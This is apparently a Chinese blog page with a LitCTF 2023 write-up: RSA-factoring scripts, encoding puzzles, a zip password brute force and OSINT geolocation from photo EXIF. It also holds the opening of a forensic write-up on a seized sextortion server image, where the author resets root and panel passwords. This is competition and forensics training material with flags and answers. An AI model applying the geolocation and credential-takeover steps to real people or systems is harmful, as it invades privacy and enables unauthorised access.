<h2 id="原来你也玩原神-初级"><a href="#原来你也玩原神-初级" class="headerlink" title="原来你也玩原神 (初级)"></a>原来你也玩原神 (初级)</h2><p>根据题目提示，这密文是原神里的东西，google找到原神中的文字为提瓦特字，并找到对应图</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image096.gif" alt="img"></p>
<p>一个一个比对得到flag</p>
<h2 id="你是我的关键词-Keyworld-初级"><a href="#你是我的关键词-Keyworld-初级" class="headerlink" title="你是我的关键词(Keyworld) (初级)"></a>你是我的关键词(Keyworld) (初级)</h2><p>搜索在线 关键字解密 </p>
<p>据题目描述推测密钥，最后得出秘钥为YOU，解密得到flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image098.gif" alt="img"></p>
<h2 id="家人们！谁懂啊，RSA签到都不会-初级"><a href="#家人们！谁懂啊，RSA签到都不会-初级" class="headerlink" title="家人们！谁懂啊，RSA签到都不会 (初级)"></a>家人们！谁懂啊，RSA签到都不会 (初级)</h2><p>简单的rsa解密，去网上找个别人写好的脚本，</p>
<p>from Crypto.Util.number import *<br> import gmpy2<br> p &#x3D; 12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073<br> q &#x3D; 12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451<br> c &#x3D; 108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057<br> e &#x3D; 65537<br> n &#x3D; p<em>q<br> print(long_to_bytes(pow(c,(gmpy2.invert(e,(p-1)</em>(q-1))),n)))</p>
<p>跑一下，得到flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image100.gif" alt="img"></p>
<h2 id="factordb-中级"><a href="#factordb-中级" class="headerlink" title="factordb (中级)"></a>factordb (中级)</h2><p>把代码丢给ai分析一下，</p>
<p>n &#x3D; 87924348264132406875276140514499937145050893665602592992418171647042491658461</p>
<p>得出需要分解一下n，</p>
<p>google找到在线分解数字网站<a target="_blank" rel="noopener" href="http://factordb.com/">http://factordb.com/</a> ，分解n得到两个数</p>
<p>275127860351348928173285174381581152299<br> 319576316814478949870590164193048041239</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image102.gif" alt="img"></p>
<p>然后就去网上找个现成脚本，一开始不能用，但是丢给ai，问几遍就可以正确运行了</p>
<p>from Crypto.Util.number import long_to_bytes</p>
<p> e &#x3D; 65537<br> n &#x3D; 87924348264132406875276140514499937145050893665602592992418171647042491658461<br> c &#x3D; 87677652386897749300638591365341016390128692783949277305987828177045932576708<br> p1 &#x3D; 275127860351348928173285174381581152299<br> p2 &#x3D; 319576316814478949870590164193048041239<br> phi &#x3D; (p1 - 1) * (p2 - 1)<br> d &#x3D; pow(e, -1, phi)<br> m &#x3D; pow(c, d, n)<br> print(long_to_bytes(m))</p>
<p>运行得到flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image104.gif" alt="img"></p>
<h2 id="yafu-中级"><a href="#yafu-中级" class="headerlink" title="yafu (中级)"></a>yafu (中级)</h2><p>下载附件发现了</p>
<p>from Crypto.Util.number import *<br> from secret import flag</p>
<p> m &#x3D; bytes_to_long(flag)<br> n &#x3D; 1<br> for i in range(15):<br>   n *&#x3D;getPrime(32)<br> e &#x3D; 65537<br> c &#x3D; pow(m,e,n)<br> print(f’n &#x3D; {n}’)<br> print(f’c &#x3D; {c}’)</p>
<p>又是分解n，找打个yafu工具分解n，</p>
<p><a target="_blank" rel="noopener" href="https://onboardcloud.dl.sourceforge.net/project/yafu/1.34/yafu-1.34.zip">https://onboardcloud.dl.sourceforge.net/project/yafu/1.34/yafu-1.34.zip</a></p>
<p>在文件夹下输入cmd可进行使用，运行命令</p>
<p>.\yafu-x64 factor(15241208217768849887180010139590210767831431018204645415681695749294131435566140166245881287131522331092026252879324931622292179726764214435307)</p>
<p>可得到15个数</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image106.jpg" alt="img"></p>
<p>分别为</p>
<p>P10 &#x3D; 2201440207</p>
<p>P10 &#x3D; 3354884521</p>
<p>P10 &#x3D; 4171911923</p>
<p>P10 &#x3D; 2719600579</p>
<p>P10 &#x3D; 4044505687</p>
<p>P10 &#x3D; 2758708999</p>
<p>P10 &#x3D; 2767137487</p>
<p>P10 &#x3D; 2585574697</p>
<p>P10 &#x3D; 2906576131</p>
<p>P10 &#x3D; 2315495107</p>
<p>P10 &#x3D; 3355651511</p>
<p>P10 &#x3D; 3989697563</p>
<p>P10 &#x3D; 4021078331</p>
<p>P10 &#x3D; 2151018733</p>
<p>P10 &#x3D; 2923522073</p>
<p>接着使用网上的脚本进行修改计算可得，可能与其他队伍脚本相似，我们是在csdn找的脚本</p>
<p>import gmpy2<br> from Crypto.Util.number import long_to_bytes</p>
<p> n &#x3D; 15241208217768849887180010139590210767831431018204645415681695749294131435566140166245881287131522331092026252879324931622292179726764214435307<br> e &#x3D; 65537<br> c &#x3D; 12608550100856399369399391849907846147170257754920996952259023159548789970041433744454761458030776176806265496305629236559551086998780836655717<br> p1 &#x3D; 2201440207<br> p2 &#x3D; 3354884521<br> p3 &#x3D; 2719600579<br> p4 &#x3D; 4171911923<br> p5 &#x3D; 2315495107<br> p6 &#x3D; 2758708999<br> p7 &#x3D; 3989697563<br> p8 &#x3D; 2923522073<br> p9 &#x3D; 2151018733<br> p10 &#x3D; 3355651511<br> p11 &#x3D; 2906576131<br> p12 &#x3D; 4044505687<br> p13 &#x3D; 4021078331<br> p14 &#x3D; 2585574697<br> p15 &#x3D; 2767137487<br> phi &#x3D; (p1 - 1) * (p2 - 1) * (p3 - 1)* (p4 - 1) * (p5 - 1)* (p6 - 1) * (p7 - 1)* (p8 - 1) * (p9 - 1)* (p10 - 1) * (p11 - 1)* (p12 - 1) * (p13 - 1)* (p14 - 1) * (p15 - 1)<br> d &#x3D; gmpy2.invert(e, phi)<br> m &#x3D; pow(c, d, n)<br> print (long_to_bytes(m))</p>
<p>运行结果为</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image108.jpg" alt="img"></p>
<h2 id="The-same-common-divisor-高级"><a href="#The-same-common-divisor-高级" class="headerlink" title="The same common divisor (高级)"></a>The same common divisor (高级)</h2><p>题目给了n1,n3,c1,c2,e，根据代码中n1、n2、n3的运算规则，首先求出n2</p>
<p>google找到其他师傅现成的脚本。跑一下，拿到flag</p>
<p>n1&#x3D; 9852079772293301283705208653824307027320071498525390578148444258198605733768947108049676831872672654449631852459503049139275329796717506126689710613873813880735666507857022786447784753088176997374711523987152412069255685005264853118880922539048290400078105858759506186417678959028622484823376958194324034590514104266608644398160457382895380141070373685334979803658172378382884352616985632157233900719194944197689860219335238499593658894630966428723660931647038577670614850305719449893199713589368780231046895222526070730152875112477675102652862254926169713030701937231206405968412044029177246460558028793385980934233<br> n3&#x3D; 4940268030889181135441311597961813780480775970170156650560367030148383674257975796516865571557828263935532335958510269356443566533284856608454193676600884849913964971291145182724888816164723930966472329604608512023988191536173112847915884014445539739070437180314205284883149421228744714989392788108329929896637182055266508625177260492776962915873036873839946591259443753924970795669864031580632650140641456386202636466624658715315856453572441182758855085077441336516178544978457053552156714181607801760605521338788424464551796638531143900048375037218585999440622490119344971822707261432953755569507740550277088437182<br> c1&#x3D; 7066425618980522033304943700150361912772559890076173881522840300333719222157667104461410726444725540513601550570478331917063911791020088865705346188662290524599499769112250751103647749860198318955619903728724860941709527724500004142950768744200491448875522031555564384426372047270359602780292587644737898593450148108629904854675417943165292922990980758572264063039172969633878015560735737699147707712154627358077477591293746136250207139049702201052305840453700782016480965369600667516646007546442708862429431724013679189842300429421340122052682391471347471758814138218632022564279296594279507382548264409296929401260<br> c2&#x3D; 854668035897095127498890630660344701894030345838998465420605524714323454298819946231147930930739944351187708040037822108105697983018529921300277486094149269105712677374751164879455815185393395371001495146490416978221501351569800028842842393448555836910486037183218754013655794027528039329299851644787006463456162952383099752894635657833907958930587328480492546831654755627949756658554724024525108575961076341962292900510328611128404001877137799465932130220386963518903892403159969133882215092783063943679288192557384595152566356483424061922742307738886179947575613661171671781544283180451958232826666741028590085269<br> n2 &#x3D; n1^n3<br> e &#x3D; 65537<br> # 正确 The same common divisor (高级)<br> import gmpy2<br> import binascii<br> p &#x3D; gmpy2.gcd(n1,n2)<br> q &#x3D; n1 &#x2F;&#x2F; p #不论是用n1还是n2整除p得到的q，最后得到的都是同一个明文m<br> phi &#x3D; (p-1)*(q-1)<br> d &#x3D; gmpy2.invert(e,phi)<br> m &#x3D; gmpy2.powmod(c1,d,n1)<br> print(binascii.unhexlify(hex(m)[2:]))</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image110.gif" alt="img"></p>
<h2 id="Small-amp-amp-SEEM和探姬的游戏-amp-amp-Prime"><a href="#Small-amp-amp-SEEM和探姬的游戏-amp-amp-Prime" class="headerlink" title="Small &amp;&amp; SEEM和探姬的游戏 &amp;&amp; Prime"></a>Small &amp;&amp; SEEM和探姬的游戏 &amp;&amp; Prime</h2><p>这几个直接用ai跑下代码，直接提交就行了，不管对错咋样，都是99分，能薅就薅</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="【Minecraft】玩的开心～～～"><a href="#【Minecraft】玩的开心～～～" class="headerlink" title="【Minecraft】玩的开心～～～"></a>【Minecraft】玩的开心～～～</h2><p>就进入mc服务器，一直玩，挖个钻石交换书本，flag就在书本里</p>
<h2 id="签到！-初级"><a href="#签到！-初级" class="headerlink" title="签到！(初级)"></a>签到！(初级)</h2><p>关注长亭珂兰寺公众号，发送签到即可获取flag。</p>
<h2 id="What-1s-BASE-初级"><a href="#What-1s-BASE-初级" class="headerlink" title="What_1s_BASE (初级)"></a>What_1s_BASE (初级)</h2><p>base64解码得flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image112.gif" alt="img"></p>
<h2 id="OSINT-探姬去哪了-0"><a href="#OSINT-探姬去哪了-0" class="headerlink" title="OSINT 探姬去哪了?_0"></a>OSINT 探姬去哪了?_0</h2><p>查看图片的全部信息发现图片拍摄地点的经纬度 ，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image114.gif" alt="img"></p>
<p>先通过度分秒转度工具将度数转换为度数，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image116.gif" alt="img"></p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image118.gif" alt="img"></p>
<p>纬度：30.788508333333333</p>
<p>经度：120.73805555555556</p>
<p>然后去在线根据经纬度定位网站查询这个地点具体是什么，发现是 浙江省嘉兴市南湖区城北路728号</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image120.gif" alt="img"></p>
<p>搜索该地点附近的电信公司，发现了中国电信大厦</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image122.gif" alt="img"></p>
<p>flag就为 NSSCTF{中国电信大厦}</p>
<h2 id="OSINT-探姬去哪了-1"><a href="#OSINT-探姬去哪了-1" class="headerlink" title="OSINT 探姬去哪了?_1"></a>OSINT 探姬去哪了?_1</h2><p>发现图片上有hacker&amp;cratf，使用百度进行搜这个关键字，发现一个酒吧</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image124.gif" alt="img"></p>
<p>则flag就是NSSCTF{黑客与精酿}</p>
<h2 id="OSINT-探姬去哪了-2"><a href="#OSINT-探姬去哪了-2" class="headerlink" title="OSINT 探姬去哪了?_2"></a>OSINT 探姬去哪了?_2</h2><p>hacking club举办地点，在群里发的hacking club通知得到举办地点 </p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkxMzE4MTc5Ng==&amp;mid=2247495412&amp;idx=1&amp;sn=2cd1f13682b8667ac0352702648e220c&amp;chksm=c10333fff674bae9b62c91ac1fb049673a8761eddf20e32b20063a69b4b79537fb26394b889c&amp;mpshare=1&amp;scene=23&amp;srcid=0425u5AogxmMXz0LAraEKN0P&amp;sharer_sharetime=1682411717881&amp;sharer_shareid=f54637fbc713483f572d8b427e564fe2#rd">https://mp.weixin.qq.com/s?__biz=MzkxMzE4MTc5Ng==&amp;mid=2247495412&amp;idx=1&amp;sn=2cd1f13682b8667ac0352702648e220c&amp;chksm=c10333fff674bae9b62c91ac1fb049673a8761eddf20e32b20063a69b4b79537fb26394b889c&amp;mpshare=1&amp;scene=23&amp;srcid=0425u5AogxmMXz0LAraEKN0P&amp;sharer_sharetime=1682411717881&amp;sharer_shareid=f54637fbc713483f572d8b427e564fe2#rd</a></p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image126.gif" alt="img"></p>
<h2 id="OSINT-探姬去哪了-3"><a href="#OSINT-探姬去哪了-3" class="headerlink" title="OSINT 探姬去哪了?_3"></a>OSINT 探姬去哪了?_3</h2><p>一看就是教学楼教室的门，作为探姬姬的同班同学，我直接作弊查看课表确认(￣y▽,￣)╭ </p>
<h2 id="404notfound-初级"><a href="#404notfound-初级" class="headerlink" title="404notfound (初级)"></a>404notfound (初级)</h2><p>丢到010里，直接搜索关键字得到flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image128.gif" alt="img"></p>
<h2 id="OSINT-这是什么地方？！"><a href="#OSINT-这是什么地方？！" class="headerlink" title="OSINT 这是什么地方？！"></a>OSINT 这是什么地方？！</h2><p>百度搜图得到关键信息，最多的就是 这条路上的车没人敢插队，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image130.gif" alt="img"></p>
<p>google搜索，发现一个b站视频里直接说出来了答案</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image132.gif" alt="img"></p>
<h2 id="Osint小麦果汁"><a href="#Osint小麦果汁" class="headerlink" title="Osint小麦果汁"></a>Osint小麦果汁</h2><p>发现图片关键信息 hacker &amp; craft，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image134.gif" alt="img"></p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image136.gif" alt="img"></p>
<p>百度搜索，发现是个浙江的酒吧，试了下，得到flag NSSCTF{黑客与精酿}</p>
<h2 id="Take-me-hand-初级"><a href="#Take-me-hand-初级" class="headerlink" title="Take me hand (初级)"></a>Take me hand (初级)</h2><p>附件是个流量包，直接搜索关键字 LitCTF，看到flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image138.gif" alt="img"></p>
<h2 id="这羽毛球怎么只有一半啊（恼-初级"><a href="#这羽毛球怎么只有一半啊（恼-初级" class="headerlink" title="这羽毛球怎么只有一半啊（恼 (初级)"></a>这羽毛球怎么只有一半啊（恼 (初级)</h2><p>直接用曾哥的暴力破解png图片长宽工具一把梭哈，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image140.gif" alt="img"></p>
<p>拿到flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image142.gif" alt="img"></p>
<h2 id="喜欢我的压缩包么-初级"><a href="#喜欢我的压缩包么-初级" class="headerlink" title="喜欢我的压缩包么 (初级)"></a>喜欢我的压缩包么 (初级)</h2><p>解压附件，发现有密码，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image144.gif" alt="img"></p>
<p>直接暴力破解，得到密码为 114514</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image146.gif" alt="img"></p>
<p>解压得到flag，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image148.gif" alt="img"></p>
<h2 id="破损的图片-初级"><a href="#破损的图片-初级" class="headerlink" title="破损的图片(初级)"></a>破损的图片(初级)</h2><p>使用010查看附件，通过前面的字节格式发现附件像是个png图片，但是前8个字节跟png图片的前8字节不太一样，百度搜下png图片格式</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image150.gif" alt="img"></p>
<p>将附件前8字节更改后，再把附件后缀改为png，就能看到flag了</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image152.gif" alt="img"></p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image154.gif" alt="img"></p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image156.gif" alt="img"></p>
<h2 id="两仪生四象-中级"><a href="#两仪生四象-中级" class="headerlink" title="两仪生四象 (中级)"></a>两仪生四象 (中级)</h2><p>先将代码喂给chat，chat理解后询问它如何通过输入encoded_text输出text</p>
<p>chat给出代码</p>
<p>_hash &#x3D; {“乾”: “111”, “兑”: “011”, “离”: “101”, “震”: “001”, “巽”: “110”, “坎”: “010”, “艮”: “100”, “坤”: “000”}</p>
<p> text &#x3D; “坤乾兑艮兑坎坤坤巽震坤巽震艮兑坎坤震兑乾坤巽坤艮兑震巽坤巽艮坤巽艮艮兑兑艮震兑乾坤乾坤坤兑艮艮坤巽坤坤巽坎坤兑离坎震艮兑坤巽坎艮兑震坤震兑乾坤乾坎坤兑坎坤震艮离坤离乾艮震艮巽震离震坤巽兑艮兑坎坤震巽艮坤离乾艮坎离坤震巽坎坤兑坤艮兑震巽震巽坎坤巽坤艮兑兑坎震巽兑”</p>
<p> binary_text &#x3D; “”<br> for c in text:<br>   binary_text +&#x3D; _hash[c]</p>
<p> decoded_text &#x3D; “”<br> for i in range(0, len(binary_text), 8):<br>   decoded_text +&#x3D; chr(int(binary_text[i:i+8], 2))</p>
<p> print(decoded_text)</p>
<p>运行后发现是乱码，重新查看题目提供的代码，经过辨认可知题目中将9个*编码为90个二进制数字，猜测十个为一组进行修改</p>
<p>更改后的代码：</p>
<p>_hash &#x3D; {“乾”: “111”, “兑”: “011”, “离”: “101”, “震”: “001”, “巽”: “110”, “坎”: “010”, “艮”: “100”, “坤”: “000”}</p>
<p> text &#x3D; “坤乾兑艮兑坎坤坤巽震坤巽震艮兑坎坤震兑乾坤巽坤艮兑震巽坤巽艮坤巽艮艮兑兑艮震兑乾坤乾坤坤兑艮艮坤巽坤坤巽坎坤兑离坎震艮兑坤巽坎艮兑震坤震兑乾坤乾坎坤兑坎坤震艮离坤离乾艮震艮巽震离震坤巽兑艮兑坎坤震巽艮坤离乾艮坎离坤震巽坎坤兑坤艮兑震巽震巽坎坤巽坤艮兑兑坎震巽兑”<br> binary_text &#x3D; “”<br> for c in text:<br>   binary_text +&#x3D; _hash[c]<br> decoded_text &#x3D; “”<br> # 将8换10<br> for i in range(0, len(binary_text), 10):<br>   # 将8换10<br>   decoded_text +&#x3D; chr(int(binary_text[i:i+10], 2))<br> print(decoded_text)</p>
<p>运行代码，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image158.gif" alt="img"></p>
<p>得到flag</p>
<h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><p>点开题目链接，直接看到flag</p>
<p>NSSCTF{LitCTF_2023?It’s_time_to_g0to_zh1hu!!!}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/05/15/LiteCTF2023-writeup/" data-id="clhoycn1n0000lsv4bmoh4tzh" data-title="LiteCTF2023_writeup" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-长安杯！宝塔取证writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/" class="article-date">
  <time class="dt-published" datetime="2023-04-28T05:01:46.000Z" itemprop="datePublished">2023-04-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/">数字取证</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/">长安杯！宝塔取证writeup</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="题目链接："><a href="#题目链接：" class="headerlink" title="题目链接："></a><strong>题目链接：</strong></h1><p> <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1hjoleZtLvDLl4IstUq2ruQ?pwd=9f3c">https://pan.baidu.com/s/1hjoleZtLvDLl4IstUq2ruQ?pwd=9f3c</a> </p>
<h1 id="案件情况："><a href="#案件情况：" class="headerlink" title="案件情况："></a><strong>案件情况：</strong></h1><p> 2021年7月12日，上午8点左右，警方接到被害人张某(张有财)报案，声称自己被敲诈数万元；经询问，张某被嫌疑人诱导裸聊，下载了某“裸聊”软件，导致自己的通讯录和裸聊视频被嫌疑人获取，对其进行敲诈，最终张某不堪重负，选择了报警；警方从张某提供的本人手机中（手机号为18805533089），定向采集到了该“裸聊”软件，通个裸聊APK软件的分析，警方找到了后台服务器地址，并调取了服务器镜像（web.E01），请各位取证工作者回答下列问题：</p>
<h1 id="题目："><a href="#题目：" class="headerlink" title="题目："></a><strong>题目：</strong></h1><ol>
<li><p>检材web.E01的操作系统版本是：</p>
</li>
<li><p>检材web.E01中，操作系统的内核版本是：</p>
</li>
<li><p>检材web.E01服务器中，最后一条操作命令为：</p>
</li>
<li><p>检材web.E01服务器中，远程连接服务所使用的端口号为：</p>
</li>
<li><p>该后台服务器中，在案发前，管理员最后一次登陆服务器的IP地址为：（答案格式111.111.111.111）</p>
</li>
<li><p>检材web.E01中，嫌疑人架设网站使用了何种工具架设了网站：</p>
</li>
<li><p>接上一题，请问架设网站的工具的登陆用户名为：</p>
</li>
<li><p>该后台网站对外提供服务所使用的端口号为：</p>
</li>
<li><p>该后台网站所使用的域名为（答案格式：<a target="_blank" rel="noopener" href="http://www.abc.com/">www.abc.com</a>）：</p>
</li>
<li><p>请分析该网站的后台登陆地址的url为：</p>
</li>
<li><p>该网站后台所使用的数据库类型为：</p>
</li>
<li><p>该网站所使用的数据库的库名（database名）为：</p>
</li>
<li><p>该网站所使用的数据库的root密码为：</p>
</li>
<li><p>请计算&#x2F;www&#x2F;wwwroot&#x2F;<a target="_blank" rel="noopener" href="http://www.honglian7001.com/app%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6&quot;database.php&quot;%E7%9A%84SHA256%E5%80%BC%EF%BC%9A">www.honglian7001.com/app目录下的文件&quot;database.php&quot;的SHA256值：</a></p>
</li>
<li><p>已知，该网站后台对于账号的密码采用加盐加密，该salt值为：</p>
</li>
<li><p>在对后台账号的密码加密处理过程中，后台一共计算几次MD5值：</p>
</li>
<li><p>请问，网站后台的创建时间最早的管理员账号为：</p>
</li>
<li><p>请综合分析并重构网站，本案中受害者张某的最后登陆IP是多少（答案格式111.111.111.111）：</p>
</li>
<li><p>请综合分析并重构网站，本案中嫌疑人所掌握的后台共获取了多少设备记录：</p>
</li>
<li><p>请综合分析并重构网站，本案中受害者张某的手机型号在后台记录中显示为：</p>
</li>
<li><p>请综合分析并重构网站，本案中受害者张某的手机通讯录中，名为“许总”的电话号码为（不需要填写空格，答案格式：18811112222）：</p>
</li>
<li><p>请综合分析并重构网站，分析该网站第一次用于诈骗活动的时间（填写到日，格式为：2000-01-01）：</p>
</li>
<li><p>请综合分析并重构网站，分析该网站设定的邀请码为：</p>
</li>
<li><p>请综合分析并重构网站，分析该网站共记录的通信录数量为：</p>
</li>
<li><p>请综合分析并重构网站，分析最常登录后台的角色昵称为：</p>
</li>
</ol>
<h6 id><a href="#" class="headerlink" title></a></h6><h1 id="先前准备："><a href="#先前准备：" class="headerlink" title="先前准备："></a><strong>先前准备</strong>：</h1><h2 id="moba连接到服务器："><a href="#moba连接到服务器：" class="headerlink" title="moba连接到服务器："></a><strong>moba连接到服务器</strong>：</h2><p>使用盘古石的计算机仿真取证系统将镜像仿真为虚拟机</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428132428113.png" alt="image-20230428132428113"></p>
<p>先查看本机VMware的虚拟网卡信息</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428133940421.png" alt="image-20230428133940421"></p>
<p>vi  &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33，编辑服务器网络接口配置文件来配置服务器网络，将对应的信息更改为虚拟网卡上的信息</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428131847307.png" alt="image-20230428131847307"></p>
<p>passwd root 将root密码更改为root，便于moba连接</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428134517300.png" alt="image-20230428134517300"></p>
<p>vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config，查看ssh配置信息，发现连接ssh端口为7001</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428135211944.png" alt="image-20230428135211944"></p>
<p>service sshd restart ，重启ssh服务</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428234508374.png"></p>
<p>配置好moba ssh连接信息，成功连接到服务器</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428135236641.png" alt="image-20230428135236641"></p>
<h2 id="Navicat连接到数据库"><a href="#Navicat连接到数据库" class="headerlink" title="Navicat连接到数据库"></a>Navicat连接到数据库</h2><h3 id="查看服务器使用的数据库类型"><a href="#查看服务器使用的数据库类型" class="headerlink" title="查看服务器使用的数据库类型"></a>查看服务器使用的数据库类型</h3><p>使用history查看服务器历史命令，发现有mysql登录以及重启操作，判定服务器使用的是mysql数据库</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428170434507.png" alt="image-20230428170434507"></p>
<h3 id="查找mysql登录账号及密码"><a href="#查找mysql登录账号及密码" class="headerlink" title="查找mysql登录账号及密码"></a>查找mysql登录账号及密码</h3><p>在一开始的取证系统中发现该服务器使用的网站管理工具为宝塔，</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428170744699.png" alt="image-20230428170744699"></p>
<p>在终端使用<code>bt</code>命令查看宝塔信息，这里需要操作两件事情，一个是修改面板密码，一个是查看面板默认信息，</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428171145272.png" alt="image-20230428171145272"></p>
<p>这里我把面板登录密码更改为 123456 ，并且知道了宝塔登录账号  yun9tinp  以及登录网址，<a target="_blank" rel="noopener" href="http://192.168.184.33:8888/d42e9f35">http://192.168.184.33:8888/d42e9f35</a></p>
<p>进入宝塔后台并成功登录宝塔面板，并发现数据库root账户的密码 为 <code>15dbefa4aae110a5</code></p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428171429981.png" alt="image-20230428171429981"></p>
<p>使用Navicat常规连接服务器数据库，无法连接，</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428181145089.png" alt="image-20230428181145089"></p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428173816542.png" alt="image-20230428173816542"></p>
<p>systemctl status mysqld 查看数据库状态，发现mysql已经dead了，systemctl restart mysqld 重启下mysql，再次查看其运行状态，发现已经是active了</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428173848972.png" alt="image-20230428173848972"></p>
<p>再次尝试用Navicat常规连接服务器mysql，这次还不行，但是学长却可以用常规方法连接。再试一下把常规连接信息填好，并且填好ssh连接的信息，保存。这次成功连接上了！！！</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428182921708.png" alt="常规连接信息"></p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428183040917.png" alt="ssh连接信息"></p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428183113934.png"></p>
